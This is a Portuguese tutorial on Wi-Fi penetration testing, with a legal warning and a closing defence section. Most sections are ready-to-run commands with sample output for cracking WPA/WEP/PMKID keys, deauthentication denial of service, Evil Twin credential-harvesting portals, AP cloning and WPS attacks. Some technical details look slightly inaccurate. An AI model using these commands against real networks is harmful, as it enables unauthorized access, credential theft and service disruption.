Introdução ao Wi-Fi Pentesting

O teste de penetração em redes Wi-Fi, também conhecido como Wi-Fi Pentesting, é uma abordagem sistemática para avaliar a segurança de redes sem fio. Este processo envolve a identificação e exploração de vulnerabilidades em configurações, protocolos e implementações de redes Wi-Fi para determinar os riscos potenciais e as falhas de segurança.

Com o avanço das tecnologias sem fio, as redes Wi-Fi se tornaram componentes críticos da infraestrutura moderna de comunicação. No entanto, sem as medidas de segurança adequadas, estas redes podem se tornar pontos de entrada para ataques cibernéticos. O pentesting Wi-Fi permite aos profissionais de segurança identificar proativamente as vulnerabilidades antes que possam ser exploradas por atacantes maliciosos.

Objetivos do Wi-Fi Pentesting

• Identificar redes sem fio vulneráveis e seus pontos fracos
• Testar a resistência de protocolos de segurança implementados
• Validar a eficácia de configurações de segurança
• Detectar dispositivos não autorizados na rede
• Avaliar a resistência contra ataques comuns
• Verificar a implementação correta de controles de acesso
• Identificar configurações incorretas que poderiam levar a violações

Aviso Legal e Ético

ALERTA IMPORTANTE

As técnicas, ferramentas e métodos descritos neste conteúdo são fornecidos EXCLUSIVAMENTE para fins educacionais e de teste de segurança legítimo. A execução não autorizada destas técnicas em redes ou sistemas sem o consentimento explícito do proprietário é ILEGAL e pode resultar em:

• Processos criminais
• Sanções civis
• Penalidades financeiras
• Prisão

Diretrizes Éticas

Ao realizar testes de penetração em redes Wi-Fi, siga estas diretrizes éticas essenciais:

  1. Obtenha Autorização Explícita
    Sempre obtenha permissão por escrito do proprietário da rede antes de iniciar qualquer teste. Documente o escopo, a duração e os métodos permitidos.
  2. Respeite os Limites
    Restrinja seus testes apenas às redes especificadas na autorização. Nunca expanda para redes adjacentes, mesmo que sejam acessíveis.
  3. Minimize o Impacto
    Conduza os testes de forma a minimizar interrupções no serviço. Evite ataques de negação de serviço (DoS) sempre que possível.
  4. Proteja os Dados
    Não capture, armazene ou examine dados de usuários. Se dados sensíveis forem inadvertidamente acessados, notifique imediatamente o proprietário da rede.
  5. Relate as Descobertas
    Documente todas as vulnerabilidades encontradas e forneça recomendações claras para mitigação. Destrua todos os dados capturados após a conclusão.
Lembre-se

Utilize sempre seu próprio ambiente de laboratório para praticar técnicas de hacking antes de realizar testes em ambientes de produção. Ambientes virtuais, como o VirtualBox com múltiplas VMs, ou redes de testes físicas isoladas são excelentes para este propósito.

Ferramentas Essenciais

O Wi-Fi pentesting exige um conjunto específico de ferramentas para identificar, analisar e explorar vulnerabilidades em redes sem fio. A maioria dessas ferramentas vem pré-instalada no Kali Linux, uma distribuição Linux especializada em testes de penetração.

Aircrack-ng
Suite completa para avaliação de segurança Wi-Fi. Inclui ferramentas para monitoramento, ataque e testes de segurança em redes 802.11.
sudo apt install aircrack-ng
Wifite
Ferramenta automatizada para auditoria de múltiplas redes Wi-Fi. Simplifica o processo de pentesting com uma interface amigável.
sudo apt install wifite
Hashcat
O cracker de senha mais rápido do mundo, útil para ataques de força bruta e dicionário contra handshakes WPA/WPA2 capturados.
sudo apt install hashcat
Ghost Phisher
Framework para criação de redes falsas (Evil Twin) com interfaces gráficas para DNS, HTTP e DHCP spoofing.
sudo apt install ghost-phisher
Wireshark
Analisador de protocolo de rede para captura e análise interativa de tráfego de rede sem fio.
sudo apt install wireshark
Bettercap
Framework moderno para MITM (Man-in-the-Middle) com módulos específicos para interceptação e análise de redes Wi-Fi.
sudo apt install bettercap
Airgeddon
Script bash multi-uso para auditoria de redes sem fio com interface de usuário baseada em terminal.
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
Kismet
Detector de rede, sniffer de pacotes e sistema de detecção de intrusão para redes 802.11.
sudo apt install kismet

Hardware Recomendado

Além do software adequado, o hardware correto é essencial para testes eficazes de redes sem fio:

Preparação do Ambiente

Antes de iniciar qualquer teste de penetração em redes Wi-Fi, é necessário configurar corretamente seu ambiente. Esta preparação inclui a verificação da compatibilidade do adaptador, configuração do modo monitor e outras etapas essenciais.

Verificação de Compatibilidade do Adaptador

Primeiro, verifique se seu adaptador Wi-Fi suporta modo monitor e injeção de pacotes:

sudo airmon-ng [sudo] password for user: PHY Interface Driver Chipset phy0 wlan0 rt2800usb Ralink Technology, Corp. RT5370

Se seu adaptador estiver listado, provavelmente é compatível. Para verificar se suporta injeção de pacotes:

sudo aireplay-ng --test wlan0 15:24:08 Trying broadcast probe requests... 15:24:08 Injection is working! 15:24:10 Found 3 APs

Habilitando o Modo Monitor

O modo monitor permite que seu adaptador capture pacotes sem estar associado a um ponto de acesso:

sudo airmon-ng check kill # Mata processos que podem interferir Killing these processes: PID Name 1234 wpa_supplicant sudo airmon-ng start wlan0 # Ativa o modo monitor PHY Interface Driver Chipset phy0 wlan0mon rt2800usb Ralink Technology, Corp. RT5370
Dica Prática

Em algumas versões mais recentes do Kali Linux, você pode usar diretamente:

sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up

Alterando o Endereço MAC (Opcional)

Para testes anônimos, é recomendável alterar o endereço MAC do adaptador:

sudo ifconfig wlan0mon down sudo macchanger -r wlan0mon # MAC aleatório Current MAC: 00:11:22:33:44:55 (unknown) Permanent MAC: AA:BB:CC:DD:EE:FF (unknown) New MAC: 01:23:45:67:89:AB (unknown) sudo ifconfig wlan0mon up
Atenção

Certifique-se de que o modo monitor está funcionando corretamente antes de prosseguir. Alguns adaptadores podem apresentar problemas com drivers específicos e podem exigir configurações adicionais.

Captura de Handshakes WPA/WPA2

O handshake WPA/WPA2 é um processo de autenticação que ocorre quando um cliente se conecta a uma rede protegida. Capturar este handshake permite que ele seja usado posteriormente para testes de força bruta.

Escaneando Redes Disponíveis

Primeiro, identifique as redes Wi-Fi disponíveis e seus canais:

sudo airodump-ng wlan0mon CH 13 ][ Elapsed: 1 min ][ 2023-09-27 15:30 BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID AA:BB:CC:DD:EE:FF -55 234 12 0 6 54e WPA2 CCMP PSK RedeWiFi 11:22:33:44:55:66 -67 187 0 0 1 54e WPA2 CCMP PSK OutraRede BSSID STATION PWR Rate Lost Frames Probe AA:BB:CC:DD:EE:FF 22:33:44:55:66:77 -52 0 - 1 0 6 RedeWiFi

Capturando o Handshake

Após identificar a rede alvo, foque na captura de seu tráfego específico:

sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon # -c 6: Canal da rede # --bssid: Endereço MAC do ponto de acesso # -w captura: Prefixo do arquivo de saída

Mantenha este terminal aberto e inicie um novo para forçar a desautenticação de um cliente conectado:

sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 22:33:44:55:66:77 wlan0mon # --deauth 10: Envia 10 pacotes de desautenticação # -a: MAC do ponto de acesso # -c: MAC do cliente (opcional) 15:35:27 Sending DeAuth to station -- STMAC: [22:33:44:55:66:77]

Quando o cliente tentar reconectar, um handshake será capturado. Você verá uma mensagem no primeiro terminal:

CH 6 ][ Elapsed: 2 min ][ 2023-09-27 15:36 ][ WPA handshake: AA:BB:CC:DD:EE:FF
Dica para Aumentar o Sucesso

Se não houver clientes conectados, você pode:

1. Esperar pacientemente até que um cliente se conecte
2. Usar desautenticação global (sem especificar cliente)
3. Tentar o ataque PMKID, que não exige clientes conectados

Verificando a Captura do Handshake

Para confirmar se o handshake foi capturado corretamente:

sudo aircrack-ng captura-01.cap 1 handshake found! Choosing first network as target.

Ataques de Força Bruta WPA/WPA2

Com o handshake capturado, podemos tentar quebrar a senha da rede. Este processo envolve testes de força bruta ou ataques de dicionário contra o handshake capturado.

Utilizando Aircrack-ng

O método mais básico é usar o aircrack-ng com um arquivo de wordlist:

sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap # -w: Caminho para a wordlist Aircrack-ng 1.6 Reading packets, please wait... Opening captura-01.cap Read 4532 packets. 1 target found! Aircrack-ng will now start KEY FOUND! [ senha123 ] Master Key : A1:B2:C3:D4:E5:F6:A7:B8:C9:D0:E1:F2:A3:B4:C5:D6 Transient Key : 00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF

Usando Hashcat (Mais Rápido)

Para quebras mais eficientes, especialmente quando se utiliza GPUs, o Hashcat é a melhor opção. Primeiro, converta o arquivo .cap para o formato HCCAPX:

cap2hccapx captura-01.cap captura.hccapx Conversion successful: 1 handshake(s) written to captura.hccapx

Agora execute o hashcat:

hashcat -m 2500 -a 0 captura.hccapx /usr/share/wordlists/rockyou.txt --force # -m 2500: Modo para WPA/WPA2 # -a 0: Ataque de dicionário hashcat (v6.1.1) starting... * Device #1: NVIDIA GeForce GTX 1660, 5980/6144 MB, 22MCU Dictionary cache built: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 Session..........: hashcat Status...........: Cracked Hash.Name........: WPA-EAPOL-PBKDF2 Hash.Target......: captura.hccapx Time.Started.....: Wed Sep 27 16:12:34 2023 (2 mins, 7 secs) Time.Estimated...: Wed Sep 27 16:14:41 2023 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Speed.#1.........: 25476 H/s (8.25ms) @ Accel:64 Loops:16 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests Progress.........: 3244032/14344385 (22.61%) Rejected.........: 0/3244032 (0.00%) Restore.Point....: 3243008/14344385 (22.61%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: senhafacil -> 123senhasegura Hardware.Mon.#1..: Temp: 67c Fan: 50% Util: 98% Core:1815MHz Mem:5000MHz Bus:8 Recovered: senha123

Criando Wordlists Customizadas

Wordlists customizadas baseadas em informações da vítima podem aumentar significativamente a chance de sucesso:

crunch 8 12 0123456789abcdefghijklmnopqrstuvwxyz -t nome%%%% -o wordlist_customizada.txt # 8 12: Comprimento mínimo e máximo da senha # -t: Padrão (% representa dígito) Crunch will now generate the following amount of data: 456976000 bytes 456 MB 0 GB crunch: 100% completed generating output
Atenção

O tempo necessário para quebrar uma senha WPA/WPA2 depende de vários fatores:

• Complexidade da senha
• Tamanho e qualidade da wordlist
• Poder computacional disponível
• Algoritmo e otimizações utilizadas

Senhas realmente fortes e aleatórias podem ser praticamente impossíveis de quebrar por força bruta.

Ataques a Redes WEP

Embora o WEP seja um protocolo legado e raramente utilizado atualmente devido às suas falhas críticas de segurança, o conhecimento sobre como comprometer redes WEP é valioso para compreender a evolução da segurança Wi-Fi.

Obsoleto, mas ainda encontrado

O WEP (Wired Equivalent Privacy) foi oficialmente declarado obsoleto em 2004 pela Wi-Fi Alliance, mas ainda pode ser encontrado em dispositivos antigos e configurações legadas. Sua quebra é significativamente mais fácil que WPA/WPA2.

Capturando IVs (Vetores de Inicialização)

O ataque WEP depende da coleta de IVs suficientes para determinar a chave. Primeiro, identifique a rede WEP:

sudo airodump-ng wlan0mon # Procure redes com ENC = WEP sudo airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w wep_captura wlan0mon # Substitua o canal e BSSID pelos da rede alvo

Associação Falsa

Para acelerar a captura de IVs, podemos usar a técnica de associação falsa:

sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon # -h: MAC da sua interface (verifique com macchanger -s wlan0mon) 17:05:43 Sending Authentication Request (Open System) [ACK] 17:05:43 Authentication successful 17:05:43 Sending Association Request [ACK] 17:05:43 Association successful :-)

Injeção de Pacotes ARP

A injeção de pacotes ARP é a técnica mais eficiente para gerar tráfego e coletar IVs:

sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 1 17:07:16 Sending ARP request [ACK] 17:07:16 Sending ARP request [ACK] Sent 256 packets... Got a deauth/disassoc packet. Is the source MAC associated?

Mantenha este processo até coletar IVs suficientes (normalmente 20.000-50.000). No terminal do airodump-ng, você verá o número de "Data" aumentando.

Quebrando a Chave WEP

Após coletar IVs suficientes, use o aircrack-ng para quebrar a chave:

sudo aircrack-ng wep_captura-01.cap Opening wep_captura-01.cap Read 35621 packets. # BSSID ESSID Encryption 1 AA:BB:CC:DD:EE:FF RedeWEP WEP (42581 IVs) Choosing first network as target. [ AE:37:B3:D4:10 ] (ASCII: .7...) Decrypted correctly: 100%
Dica Prática

Outras técnicas úteis para acelerar a captura de IVs:

• Ataque Fragmentação: sudo aireplay-ng --fragment -b [BSSID] wlan0mon
• Ataque ChopChop: sudo aireplay-ng --chopchop -b [BSSID] wlan0mon
• Ataques Interativos: sudo aireplay-ng --interactive -b [BSSID] wlan0mon

Ataque PMKID

O ataque PMKID, descoberto em 2018, permite capturar informações para quebra de senha WPA/WPA2 sem necessidade de handshake completo ou clientes conectados, representando uma evolução significativa nos métodos de auditoria Wi-Fi.

Vantagem Principal

A principal vantagem do ataque PMKID é que ele não exige a presença de clientes conectados à rede. Basta o ponto de acesso estar ativo e suportar o roaming 802.11r (muitos APs modernos suportam).

Capturando PMKID com Hcxdumptool

O hcxdumptool é a ferramenta mais eficaz para capturar PMKID:

sudo apt install hcxdumptool hcxtools # Instala as ferramentas necessárias sudo hcxdumptool -i wlan0mon -o pmkid_captura.pcapng --enable_status=1 initialization... start capturing (stop with ctrl+c) INTERFACE:................: wlan0mon FILTERLIST...............: 0 entries FILTERMODE...............: unused WEAK CANDIDATE...........: 12345678 INFO: cha=1, rx=3, rx(dropped)=0, tx=2, powned=1, err=0 INFO: cha=1, rx=5, rx(dropped)=0, tx=4, powned=2, err=0

O processo pode levar algum tempo. Quando vir a mensagem "powned", isso indica que um PMKID foi capturado. Pressione Ctrl+C para parar a captura após algum sucesso.

Convertendo e Quebrando o PMKID

Após a captura, converta o arquivo para o formato compatível com hashcat:

sudo hcxpcapngtool -o pmkid_hash.16800 pmkid_captura.pcapng reading from pmkid_captura.pcapng... PMKIDs...........: 3 written to pmkid_hash.16800 EAPOL pairs......: 0 written to pmkid_hash.16800

Agora utilize o hashcat para quebrar o hash PMKID:

hashcat -m 16800 -a 0 pmkid_hash.16800 /usr/share/wordlists/rockyou.txt --force # -m 16800: Modo para PMKID hashcat (v6.1.1) starting... * Device #1: NVIDIA GeForce GTX 1660, 5980/6144 MB, 22MCU Dictionary cache built: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 Session..........: hashcat Status...........: Cracked Hash.Name........: WPA-PMKID-PBKDF2 Hash.Target......: pmkid_hash.16800 Recovered........: 1/3 (33.33%) Digests Progress.........: 5781504/43033155 (13.44%) Restored: senha12345
Alternativa Automatizada: Wifite

O Wifite (versão 2 ou superior) inclui suporte para ataques PMKID automatizados:

sudo wifite --pmkid

Esta opção simplifica todo o processo, gerenciando a captura e conversão automaticamente.

Criação de Redes Falsas (Evil Twin)

O ataque Evil Twin envolve a criação de um ponto de acesso falso que imita uma rede legítima, permitindo interceptar o tráfego dos usuários que se conectam a ele. Esta técnica é particularmente eficaz para capturas de credenciais e ataques Man-in-the-Middle.

Uso Ético

A criação de redes falsas é uma técnica invasiva que pode impactar outros usuários. Use apenas em ambientes controlados, com permissão explícita e para fins educativos legítimos.

Método 1: Usando o Airbase-ng

O airbase-ng permite criar um ponto de acesso falso diretamente do Kali Linux:

sudo airmon-ng check kill # Mata processos conflitantes sudo airbase-ng -e "RedeWiFi" -c 6 wlan0mon # -e: Nome da rede (ESSID) # -c: Canal 18:45:23 Created tap interface at0 18:45:23 Trying to set MTU on at0 to 1500 18:45:23 Access Point with BSSID 00:11:22:33:44:55 started.

Após criar o AP, configure a interface para fornecer DHCP:

sudo ifconfig at0 up 192.168.1.1 netmask 255.255.255.0 sudo route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

Método 2: Usando o Airgeddon (Mais Completo)

O Airgeddon automatiza todo o processo de criação de Evil Twin com portal captivo:

git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git cd airgeddon sudo bash airgeddon.sh # Siga os menus interativos: # 1. Selecione sua interface # 2. Ative o modo monitor # 3. Escolha a opção Evil Twin # 4. Selecione o portal captivo

Método 3: Portal Captivo com Wifiphisher

O Wifiphisher é especializado em criar Evil Twins com portais captivos convincentes:

sudo apt install wifiphisher sudo wifiphisher # Interface gráfica será exibida para seleção da rede alvo # Escolha o tipo de ataque (Portal Update, OAuth login, etc.)

Criando um Portal Captivo Personalizado

Para ataques mais avançados, você pode criar portais captivos personalizados que imitam sites legítimos:

sudo apt install apache2 sudo service apache2 start sudo mkdir -p /var/www/html/portal sudo nano /var/www/html/portal/index.html # Crie um portal de login falso que se assemelhe ao portal alvo sudo nano /var/www/html/portal/captura.php # Código PHP para salvar as credenciais inseridas
Detecção e Defesa

Usuários atentos podem detectar Evil Twins através de:

• Rede aberta quando a original exige senha
• Diferenças na intensidade do sinal
• MAC address do ponto de acesso diferente
• Certificados inválidos em portais HTTPS

Clonagem de Pontos de Acesso

A clonagem de pontos de acesso vai além do Evil Twin básico, reproduzindo com precisão todas as características do AP original, incluindo MAC address, canal, e outras configurações.

Identificando Características para Clonagem

Primeiro, colete todas as informações relevantes do AP alvo:

sudo airodump-ng wlan0mon # Anote: BSSID, Canal, ESSID, Tipo de criptografia

Clonagem com Airbase-ng

Configure o airbase-ng para clonar perfeitamente o AP:

sudo macchanger --mac=AA:BB:CC:DD:EE:FF wlan0mon # Clone o MAC do AP alvo sudo airbase-ng -a AA:BB:CC:DD:EE:FF -e "RedeWiFi" -c 6 -Z 4 wlan0mon # -a: MAC address a emular # -e: ESSID da rede alvo # -c: Canal da rede alvo # -Z 4: Emular WPA2-PSK 19:12:45 Created tap interface at0 19:12:45 Trying to set MTU on at0 to 1500 19:12:45 Access Point with BSSID AA:BB:CC:DD:EE:FF started.

Clonagem Avançada com Mdk4

O MDK4 oferece capacidades avançadas para clonagem de vários APs simultaneamente:

sudo apt install mdk4 echo "RedeWiFi" > ssids.txt sudo mdk4 wlan0mon b -f ssids.txt -a -g -w # b: Modo Beacon Flood # -f: Arquivo com SSIDs # -a: Inclui autenticação # -g: Válido para ambos 802.11b/g # -w: WPA2 encryption flag

Clonagem com Ataque de Desautenticação

Para ser mais eficaz, combine a clonagem com desautenticação para forçar a conexão ao AP clonado:

sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon # Deauth contínuo # Em outro terminal, mantenha o AP clonado rodando
Uso de Múltiplas Interfaces

Para clonagem mais eficaz, use duas interfaces sem fio:

• Uma para monitorar e enviar desautenticação ao AP original
• Outra para hospedar o AP clonado
Este método elimina interferências e melhora a confiabilidade do ataque.

Ataques de Desautenticação

O ataque de desautenticação explora uma falha no protocolo 802.11 que permite enviar pacotes forjados para desconectar clientes de um ponto de acesso. Este ataque é útil para capturar handshakes, mas também pode ser usado como um ataque de negação de serviço.

Desautenticação Direcionada

Para desautenticar um cliente específico de uma rede:

sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon # Identifique o cliente sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 22:33:44:55:66:77 wlan0mon # --deauth 5: Envia 5 pacotes (use 0 para envio contínuo) # -a: BSSID do AP # -c: MAC do cliente alvo 20:05:17 Sending DeAuth to station -- STMAC: [22:33:44:55:66:77] 20:05:17 Sending DeAuth to station -- STMAC: [22:33:44:55:66:77] 20:05:18 Sending DeAuth to station -- STMAC: [22:33:44:55:66:77]

Desautenticação em Massa

Para desautenticar todos os clientes de uma rede ao mesmo tempo:

sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon # Sem o parâmetro -c, todos os clientes são afetados 20:07:32 Sending DeAuth to broadcast -- BSSID: [AA:BB:CC:DD:EE:FF] 20:07:33 Sending DeAuth to broadcast -- BSSID: [AA:BB:CC:DD:EE:FF]

Ataque Contínuo (DoS)

Para um ataque de negação de serviço contínuo, enviando desautenticações constantemente:

sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon # 0 significa envio contínuo de pacotes 20:10:15 Sending DeAuth to broadcast -- BSSID: [AA:BB:CC:DD:EE:FF] 20:10:16 Sending DeAuth to broadcast -- BSSID: [AA:BB:CC:DD:EE:FF] 20:10:17 Sending DeAuth to broadcast -- BSSID: [AA:BB:CC:DD:EE:FF] # Pressione Ctrl+C para parar

Automação com MDK4

O MDK4 oferece recursos avançados para ataques de desautenticação:

sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -c 6 # d: Modo de desautenticação # -B: BSSID do AP alvo # -c: Canal

Ataque com Wifijammer

O Wifijammer é uma ferramenta especializada em ataques de desautenticação:

git clone https://github.com/DanMcInerney/wifijammer.git cd wifijammer sudo python wifijammer.py -a AA:BB:CC:DD:EE:FF -i wlan0mon # -a: MAC do AP (opcional, sem ele ataca todas as redes) # -i: Interface em modo monitor
Mitigação e Proteção

A partir do padrão 802.11w (Management Frame Protection), algumas redes são protegidas contra ataques de desautenticação. Mas a maioria dos APs domésticos e muitos comerciais ainda são vulneráveis. A principal defesa é identificar a origem dos pacotes de desautenticação e bloquear fisicamente o atacante.

Ataques a WPS

O Wi-Fi Protected Setup (WPS) foi criado para simplificar a conexão de dispositivos a redes Wi-Fi protegidas, mas introduziu vulnerabilidades que podem ser exploradas para obter acesso não autorizado.

Verificando Redes com WPS Ativo

Primeiro, identifique redes com WPS habilitado:

sudo wash -i wlan0mon BSSID Ch dBm WPS Lck Vendor ESSID ------------------------------------------------- AA:BB:CC:DD:EE:FF 6 -58 1.0 No TP-Link RedeWiFi 11:22:33:44:55:66 1 -72 2.0 Yes Netgear OutraRede # Lck = No: Rede sem bloqueio de PIN (vulnerável)

Ataque Pixie Dust

O ataque Pixie Dust explora vulnerabilidades em implementações WPS para recuperar o PIN em segundos:

sudo apt install reaver sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv # -K 1: Ativa o ataque Pixie Dust # -vv: Modo verbose Reaver v1.6.5 WiFi Protected Setup Attack Tool Copyright (c) 2011, Tactical Network Solutions, Craig Heffner [+] Switching wlan0mon to channel 6 [+] Starting Pixie Dust attack against AA:BB:CC:DD:EE:FF [+] Trying pin "12345670" [+] WPS PIN: '12345670' [+] WPA PSK: 'senhadarede123' [+] AP SSID: 'RedeWiFi'

Ataque de Força Bruta WPS

Se o Pixie Dust falhar, tente a força bruta tradicional (pode levar horas):

sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv # Sem -K, realiza força bruta padrão [+] Trying pin "12345670" [-] Pin "12345670" failed [+] Trying pin "87654321" # Este processo testa todos os PINs possíveis

Automatização com Wifite

O Wifite pode automatizar ataques WPS, tentando primeiro Pixie Dust e depois força bruta:

sudo wifite --wps -i wlan0mon # --wps: Foca apenas em redes com WPS habilitado

Ataque OneShot com Bully

O Bully é outra ferramenta eficaz para explorar vulnerabilidades WPS:

sudo apt install bully sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3 wlan0mon # -b: BSSID do AP alvo # -c: Canal # -d: Modo de depuração # -v 3: Nível de verbosidade [+] Rx( M1 ) = 'WPS Message M1' [+] Tx( M2 ) = 'WPS Message M2' [+] Detected AP rate limiting, waiting 60 seconds before next pin attempt [+] Pin attempt count for '12345670' = 1
Dicas para Ataques WPS Bem-Sucedidos

• Mantenha proximidade física do AP para sinais fortes
• Use o parâmetro -r para contornar limitações de taxa
• O parâmetro -L no reaver contorna bloqueios temporários
• Em caso de lockout, aguarde 30-60 minutos
• Alguns APs desabilitam WPS após múltiplas tentativas falhas

Ataque KRACK

O KRACK (Key Reinstallation Attack) é uma vulnerabilidade crítica descoberta em 2017 que afeta o protocolo WPA2, permitindo que atacantes interceptem e decodifiquem tráfego criptografado sem conhecer a senha da rede.

Ataque Mitigado em Dispositivos Atualizados

A maioria dos dispositivos modernos já recebeu patches para mitigar o KRACK. Esta seção é apresentada principalmente para fins educacionais e compreensão histórica da evolução da segurança Wi-Fi.

Princípio do KRACK

O KRACK explora uma falha no 4-way handshake do WPA2, forçando a reinstalação de chaves já utilizadas e permitindo:

  • Manipulação do Handshake
    O atacante manipula e retransmite mensagens do handshake de 4 vias, forçando a reinstalação de chaves já em uso.
  • Resetar Nonces
    A reinstalação da chave reseta os nonces (números usados uma vez) e os contadores de replay, comprometendo a segurança do protocolo.
  • Descriptografia Parcial ou Total
    Dependendo do protocolo de criptografia (CCMP, GCMP, WPA-TKIP), o atacante pode decifrar dados, forjar pacotes ou injetar malware.

Ferramenta KRACK Demonstration

A ferramenta krackattacks-scripts permite demonstrar e testar a vulnerabilidade:

git clone https://github.com/vanhoefm/krackattacks-scripts.git cd krackattacks-scripts sudo apt-get install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome sudo python krack-test-client.py # Este script verifica se um cliente é vulnerável ao KRACK

Demonstração do Ataque

Para fins educacionais, a ferramenta permite simular o ataque:

sudo python krack-all-zero-tk.py # Este script demonstra a vulnerabilidade instalando uma chave de todos zeros [21:15:47] Starting hostapd [21:15:48] Starting channel X monitor interface on mon0 [21:15:49] Ready. Connect a client to this hostapd AP to test if it's vulnerable.
Limitações e Considerações

• O atacante deve estar próximo à vítima (dentro do alcance da rede)
• Não quebra a senha da rede WiFi em si
• O tráfego HTTPS permanece protegido (camada adicional)
• A vulnerabilidade foi amplamente corrigida com atualizações
• Afeta principalmente dispositivos antigos ou não atualizados

Verificando Vulnerabilidade

Para verificar se seus dispositivos são vulneráveis:

sudo python krack-test-client.py [+] AP transmitted data to client after key reinstallation [+] Client is vulnerable to key reinstallation in the 4-way handshake (CVE-2017-13077) # Ou em caso negativo: [-] Client is NOT vulnerable to key reinstallation in the 4-way handshake

Técnicas de Defesa

Entender como proteger redes Wi-Fi é tão importante quanto conhecer as técnicas de ataque. Esta seção apresenta métodos para defender redes sem fio contra as vulnerabilidades discutidas anteriormente.

Proteção Contra Força Bruta WPA/WPA2

Para proteger redes contra ataques de força bruta:

Senhas Fortes

• Use senhas com pelo menos 12 caracteres
• Combine letras maiúsculas, minúsculas, números e símbolos
• Evite palavras de dicionário ou informações pessoais
• Use geradores de senha aleatórios
• Exemplo: tK8&pQr$2L!9zB é significativamente mais seguro que Senha123!

openssl rand -base64 12 # Gera uma senha aleatória forte dBH7tP8JwQ3/Vx+1

Proteção Contra Evil Twin

Para proteger-se contra ataques de redes falsas:

  1. Implementar Autenticação 802.1X/EAP
    Use autenticação baseada em certificados para evitar que usuários se conectem a APs falsos. Isso requer uma infraestrutura de chave pública (PKI) e servidores RADIUS.
  2. Monitoramento de Rogue AP
    Configure sistemas de detecção de intrusão sem fio (WIDS) para identificar APs não autorizados:
sudo apt install kismet sudo kismet -c wlan0 # Kismet detectará APs na área e alertará sobre possíveis clones

Desativando WPS

Para proteger contra ataques WPS:

Acesso ao Roteador

1. Acesse a interface de administração do roteador (geralmente http://192.168.0.1 ou http://192.168.1.1)
2. Navegue até as configurações wireless ou de segurança
3. Localize as opções WPS e desative completamente
4. Salve as configurações e reinicie o roteador

Proteção Contra Desautenticação

Mitigando ataques de desautenticação:

802.11w (Management Frame Protection)

• Verifique se seu AP suporta 802.11w (PMF)
• Ative a Proteção de Quadros de Gerenciamento nas configurações
• Configure como "Obrigatório" para máxima proteção
• Esteja ciente que dispositivos antigos podem não suportar PMF

Segmentação de Rede

Implementando isolamento e segmentação:

  1. VLANs para Isolamento
    Separe redes de convidados, IoT e corporativas em VLANs distintas para conter potenciais comprometimentos.
  2. Isolamento de Cliente
    Ative o "Client Isolation" ou "AP Isolation" para impedir que clientes wireless se comuniquem diretamente entre si.
  3. Firewall por SSID
    Configure regras de firewall específicas para cada SSID, limitando o acesso apenas aos recursos necessários.

Detecção de Intrusão Wireless

Implementando WIDS/WIPS (Wireless Intrusion Detection/Prevention System):

sudo apt install kismet sudo kismet_server -c wlan0mon Server starting on port 2501 # Acesse http://localhost:2501 para monitorar atividades suspeitas
Melhores Práticas Adicionais

• Troque o SSID padrão (mas não use informações identificáveis)
• Atualize regularmente o firmware do roteador
• Desative administração remota
• Use endereços MAC estáticos para dispositivos críticos
• Implemente autenticação em 2 fatores onde disponível
• Considere redes mesh seguras para ambientes maiores
